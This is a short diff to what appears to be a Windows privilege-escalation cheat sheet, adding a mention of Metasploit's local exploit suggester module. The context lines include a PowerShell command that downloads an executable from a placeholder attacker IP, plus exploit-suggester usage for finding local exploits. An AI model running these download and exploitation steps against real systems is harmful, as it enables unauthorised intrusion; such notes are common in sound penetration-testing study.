@@ -137,6 +137,8 @@ iwr -uri http://<ip_address>/file.exe -outfile sh.exe
 systeminfo <-- copy output to file
 windows-exploit-suggester.py --update
 windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt <-- output of systeminfo command
+
+we can also use metasploit built in module called local_exploit_suggestor
 ```
 
 
